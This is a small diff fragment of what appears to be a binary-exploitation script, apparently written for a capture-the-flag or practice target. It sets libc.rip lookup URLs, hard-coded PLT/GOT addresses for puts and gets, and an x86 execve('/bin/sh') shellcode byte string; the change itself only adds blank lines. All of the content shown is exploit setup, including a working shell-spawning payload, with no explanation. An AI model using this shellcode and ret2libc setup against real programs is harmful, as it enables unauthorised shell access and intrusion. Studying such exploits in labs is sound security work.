@@ -9,7 +9,9 @@ BUFF_SIZE = 132
 FIND_LIBC_URL = 'https://libc.rip/api/find'
 LIBC_SEARCH_URL = "https://libc.rip/api/libc/"
 HEADERS = {'Content-Type': 'application/json'}
+
 PLT_PUTS, PLT_GETS, MAIN_ADDR, GOT_PUTS = 0x8048340, 0x08048330, 0x804847b, 0x80497ac
+
 SHELLCODE = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
 
 
